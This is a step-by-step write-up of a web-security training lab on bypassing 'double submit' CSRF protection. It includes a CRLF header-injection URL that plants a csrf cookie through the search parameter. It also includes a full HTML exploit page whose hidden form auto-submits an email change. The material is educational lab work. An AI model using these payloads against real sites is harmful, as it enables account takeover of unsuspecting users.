# CSRF where token is duplicated in cookie
* This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
	* To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's eamil address.
	* You can log in to your own account using the following credentials: `wiener:peter`
### 1. Enumerate email upadte functionality
![23](https://user-images.githubusercontent.com/53956303/153687479-4760f86e-0f3c-4a71-8e0b-8577b9ed1977.png)
* The CSRF token is the same as `csrf` cookie. The site is using the duplicated cookie.
### 2. Test the search functionality
* The search functionality is not CSRF token protected.

![21](https://user-images.githubusercontent.com/53956303/153687133-28e31926-2d85-40c0-8102-13f0f93fe0d6.png)
* It might be used to inject a cookie
### 3. Inject cookie using the search panel
* URL ENCODE TO USE.
```bash
/?search=test
Set-Cookie: csrf=MaliciousCSRFToken
```
* or
```bash
/?search=test%0d%0aSet-Cookie:%20csrf=MaliciousCSRFToken
```
* It works! A cookie `MaliciousCSRFToken` is injected as a `csrf` cookie.

![22](https://user-images.githubusercontent.com/53956303/153688109-55f7b97b-09cb-4512-b678-7259cc20e0f0.png)
### 4. Make a malicious HTML on the provided Exploit server
* Inject the token injection URL
```html
<form method=post action=https://ac691fd51fee93f6c0c41a2100ca00c4.web-security-academy.net/my-account/change-email>
    <input type="hidden" name="email" value="duplicatedCSRF@pwn.com">
    <input type="hidden" name="csrf" value="MaliciousCSRFToken">
</form>
<img src="https://ac691fd51fee93f6c0c41a2100ca00c4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=MaliciousCSRFToken" onerror="document.forms[0].submit()">
```
![24](https://user-images.githubusercontent.com/53956303/153688277-6cec3cf5-d521-46e1-987d-56d3b592713c.png)

* Store and deliver the exploit.
	* As a result, the lab is solved.

![25](https://user-images.githubusercontent.com/53956303/153688297-00f8dd89-d583-42fd-8f9c-18c4747d6c8d.png)
